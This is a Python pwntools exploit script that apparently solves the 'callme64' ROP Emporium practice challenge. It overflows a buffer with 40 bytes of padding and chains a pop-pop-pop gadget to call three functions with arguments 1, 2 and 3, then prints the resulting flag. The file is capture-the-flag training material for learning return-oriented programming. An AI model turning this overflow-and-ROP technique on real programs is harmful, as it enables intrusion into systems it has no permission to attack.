#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
e = ELF("./callme64")

CALLME_ONE = 0x401850
CALLME_TWO = 0x401870
CALLME_THREE = 0x401810
POP_POP_POP = p64(e.symbols['usefulGadgets']) + p64(0x1) + p64(0x2) + p64(0x3)
PADDING = "A"*40
PAYLOAD = PADDING + POP_POP_POP + p64(CALLME_ONE) + POP_POP_POP + p64(CALLME_TWO) + POP_POP_POP + p64(CALLME_THREE)

p = process(['./callme64'])
msg = p.recv(timeout=0.1)
print msg

p.sendline(PAYLOAD)
msg = p.recvuntil('}')
print msg

p.close()
